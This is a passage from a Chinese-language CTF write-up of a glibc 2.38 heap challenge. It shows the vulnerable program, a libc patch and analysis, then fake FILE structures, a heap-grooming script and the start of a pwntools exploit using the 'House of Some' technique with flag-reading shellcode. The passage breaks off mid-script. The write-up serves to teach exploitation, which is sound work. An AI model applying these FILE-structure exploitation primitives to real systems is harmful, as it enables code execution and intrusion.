class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> addr, length;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;offset&gt; &quot;</span>);</span><br><span class=\"line\">    addr = getint();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;length&gt; &quot;</span>);</span><br><span class=\"line\">    length = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(length &lt; <span class=\"number\">0</span> || length &gt; <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fread(<span class=\"number\">0x114514000</span>+addr, <span class=\"number\">1</span>, <span class=\"number\">1</span>, dev);</span><br><span class=\"line\">    magic = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">show</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;name: %s\\n&quot;</span>, name);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;picture: &quot;</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"number\">0x114514000</span>, <span class=\"number\">0x1000</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    init();</span><br><span class=\"line\">    <span class=\"type\">size_t</span> choice;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(mmap(<span class=\"number\">0x114514000</span>, <span class=\"number\">0x1000</span>, PROT_READ | PROT_WRITE, <span class=\"number\">0x22</span>, <span class=\"number\">-1</span>, <span class=\"number\">0</span>) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;mmap error.\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;gift: %p\\n&quot;</span>, <span class=\"number\">0x114514000</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. name\\n2. dev\\n3. draw\\n4 .show\\n5. exit\\n&gt; &quot;</span>);</span><br><span class=\"line\">        choice = getint();</span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (choice)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">                change_name();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">                change_dev();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">                draw();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">                show();</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;  </span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;invalid option %ld.\\n&quot;</span>, choice);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>除了题目代码之外，还自己编译了一个libc，加上patch，patch如下</p>\n<figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">diff --git a/libio/libioP.h b/libio/libioP.h</span></span><br><span class=\"line\"><span class=\"comment\">index 745278e..b3858d1 100644</span></span><br><span class=\"line\"><span class=\"comment\">--- a/libio/libioP.h</span></span><br><span class=\"line\"><span class=\"comment\">+++ b/libio/libioP.h</span></span><br><span class=\"line\"><span class=\"meta\">@@ -100,7 +100,7 @@</span></span><br><span class=\"line\"> #define _IO_JUMPS_FILE_plus(THIS) \\</span><br><span class=\"line\">   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span><br><span class=\"line\"> #define _IO_WIDE_JUMPS(THIS) \\</span><br><span class=\"line\"><span class=\"deletion\">-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class=\"line\"><span class=\"addition\">+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable))</span></span><br><span class=\"line\"> #define _IO_CHECK_WIDE(THIS) \\</span><br><span class=\"line\">   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>可以看到，这里对wide_data加上了patch</p>\n<p>编译时的命令如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; ../configure --prefix=/home/csome/houseofsome/glibc-2.38/build/x64 --disable-werror --enable-bind-now</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<p>详细编译流程见Tover师兄写的<a href=\"https://0xffff.one/d/337\">https://0xffff.one/d/337</a></p>\n<h2 id=\"简单的分析\"><a href=\"#简单的分析\" class=\"headerlink\" title=\"简单的分析\"></a>简单的分析</h2><p>通过逆向可以知道，这里泄露libc是通过scanf的未写入trick实现的，但是ida观察init函数的时候，并不能发现stdin等数据放到了栈上，需要gdb观察或者阅读汇编才知道。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">init</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp1 = <span class=\"built_in\">stdin</span>;</span><br><span class=\"line\">    setbuf(tmp1, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp2 = <span class=\"built_in\">stdout</span>;</span><br><span class=\"line\">    setbuf(tmp2, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> tmp3 = <span class=\"built_in\">stderr</span>;</span><br><span class=\"line\">    setbuf(tmp3, <span class=\"number\">0</span>);</span><br><span class=\"line\">    install_seccomp();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其次，这里有一次libc内任意地址写\\x00的机会在draw功能</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">draw</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(magic || !dev || !name) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">size_t</span> addr, length;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;offset&gt; &quot;</span>);</span><br><span class=\"line\">    addr = getint();</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;length&gt; &quot;</span>);</span><br><span class=\"line\">    length = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(length &lt; <span class=\"number\">0</span> || length &gt; <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fread(<span class=\"number\">0x114514000</span>+addr, <span class=\"number\">1</span>, <span class=\"number\">1</span>, dev);</span><br><span class=\"line\">    magic = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>还有一个小trick——fopen，这个函数会使用malloc分配一个IO_FILE_plus结构，作为打开文件的管理块，并通过头插法进入IO_list_all</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">change_dev</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev) fclose(dev);</span><br><span class=\"line\">    <span class=\"type\">size_t</span> op;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1. /dev/urandom\\n2. /dev/zero\\n3. /dev/null\\ndev&gt; &quot;</span>);</span><br><span class=\"line\">    op = getint();</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(op == <span class=\"number\">1</span>) dev = fopen(<span class=\"string\">&quot;/dev/urandom&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">2</span>) dev = fopen(<span class=\"string\">&quot;/dev/zero&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> dev = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(dev == <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;open dev error.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    setbuf(dev, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>总结一下</p>\n<ol>\n<li>已知Libc地址</li>\n<li>一次libc内任意地址写1字节\\x00，off by null</li>\n<li>fopen能使得IO_list_all内写入heap地址</li>\n<li>由于wide_data的vtable加入了check，故不能使用apple2的链条</li>\n</ol>\n<h2 id=\"House-of-Some\"><a href=\"#House-of-Some\" class=\"headerlink\" title=\"House of Some\"></a>House of Some</h2><p>详细的原理见<a href=\"https://blog.csome.cc/p/house-of-some/\">https://blog.csome.cc/p/house-of-some/</a></p>\n<p>其使用的方法是</p>\n<ol>\n<li>已知glibc基地址</li>\n<li>可控的已知地址（可写入内容构造fake file）</li>\n<li>需要一次libc内任意地址写可控地址</li>\n<li>程序能正常退出或者通过exit()退出</li>\n</ol>\n<p>其中，条件1和4程序中可以直接满足，条件3可以通过fopen和一次off by null完成，条件2可以被弱化，并不需要已知，只需要可控即可</p>\n<p>那么在构造任意地址写的fake_file的过程中，需要wide_data指针，这个指针需要在可控地址位置——堆内，但是我们并不能泄露堆地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fake_file_read = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: 任意地址写的起始地址, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: 任意地址写的终止地址, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0xc0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: wide_data的地址, <span class=\"comment\"># _wide_data</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: 下一个调用的fake file地址, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>: _IO_wfile_jumps, <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_wide_data = flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>: _IO_file_jumps - <span class=\"number\">0x48</span>,</span><br><span class=\"line\">    <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>这里需要使用largebin的next size指针残留，构造出一个合法的wide_data地址</p>\n<p>PS：这里可以运用<a href=\"https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more%EF%BC%8C%E6%94%B9%E8%BF%9B%E5%90%8E%E5%B0%B1%E4%B8%8D%E9%9C%80%E8%A6%81wide_data%E4%BA%86\">https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more，改进后就不需要wide_data了</a></p>\n<p>风水脚本如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">name(<span class=\"number\">0x2b0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x260</span>: &#123;</span><br><span class=\"line\">        <span class=\"number\">0x18</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">        <span class=\"number\">0x20</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">        <span class=\"number\">0x30</span>: <span class=\"number\">0</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x1f00</span>-<span class=\"number\">0x730</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x400</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x590</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xe0</span>-<span class=\"number\">0x60</span>: libc.symbols[<span class=\"string\">&#x27;_IO_file_jumps&#x27;</span>] - <span class=\"number\">0x48</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>) + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x50</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x600</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x610</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x300</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x2f0</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x360</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br><span class=\"line\">name(<span class=\"number\">0x210</span>-<span class=\"number\">1</span>, <span class=\"string\">b&quot;aa&quot;</span> + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后伪造，这里中间需要使用指针残留，所以伪造fake_file的时候，需要分开</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">environ = libc.symbols[<span class=\"string\">&#x27;__environ&#x27;</span>]</span><br><span class=\"line\">name(<span class=\"number\">0xb0</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0x00</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _flags</span></span><br><span class=\"line\">    <span class=\"number\">0x20</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_base</span></span><br><span class=\"line\">    <span class=\"number\">0x28</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _IO_write_ptr</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"number\">0x38</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _IO_buf_base</span></span><br><span class=\"line\">    <span class=\"number\">0x40</span>: environ+<span class=\"number\">8</span>+<span class=\"number\">0x400</span>, <span class=\"comment\"># _IO_buf_end</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"number\">0x70</span>: <span class=\"number\">0</span>, <span class=\"comment\"># _fileno</span></span><br><span class=\"line\">    <span class=\"number\">0x68</span>: environ+<span class=\"number\">8</span>, <span class=\"comment\"># _chain</span></span><br><span class=\"line\">    <span class=\"number\">0x82</span>: <span class=\"string\">b&quot;\\x00&quot;</span>, <span class=\"comment\"># _vtable_offset</span></span><br><span class=\"line\">    <span class=\"number\">0x88</span>: environ-<span class=\"number\">0x10</span>,</span><br><span class=\"line\">    <span class=\"number\">0xa0</span>: <span class=\"string\">b&quot;\\n&quot;</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">name(<span class=\"number\">0x20</span>-<span class=\"number\">1</span>, flat(&#123;</span><br><span class=\"line\">    <span class=\"number\">0xc0</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: <span class=\"number\">2</span>, <span class=\"comment\"># _mode</span></span><br><span class=\"line\">    <span class=\"number\">0xd8</span>-<span class=\"number\">0x20</span>-<span class=\"number\">0xa0</span>: libc.symbols[<span class=\"string\">&#x27;_IO_wfile_jumps&#x27;</span>], <span class=\"comment\"># vtable</span></span><br><span class=\"line\">&#125;, filler=<span class=\"string\">b&quot;\\x00&quot;</span>)[:-<span class=\"number\">1</span>] + <span class=\"string\">b&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>最后houseofsome一把梭</p>\n<h2 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h2><p>House_of_some工具见<a href=\"https://github.com/CsomePro/House-of-Some\">https://github.com/CsomePro/House-of-Some</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> House_of_some <span class=\"keyword\">import</span> HouseOfSome</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(</span><br><span class=\"line\"><span class=\"string\">f&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">mov rax, <span class=\"subst\">&#123;u64(<span class=\"string\">b&quot;./flag&quot;</span> + <span class=\"built_in\">bytearray</span>([<span class=\"number\">0</span>,<span class=\"number\">0</span>]))&#125;</span></span></span><br><span class=\"line\"><span class=\"string\">push rax</span></span><br><span class=\"line\"><span class=\"string\">mov rdi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, 0</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 2</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, rax</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 0</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi, 1</span></span><br><span class=\"line\"><span class=\"string\">mov rsi, rsp</span></span><br><span class=\"line\"><span class=\"string\">mov rdx, 0x40</span></span><br><span class=\"line\"><span class=\"string\">mov rax, 1</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span 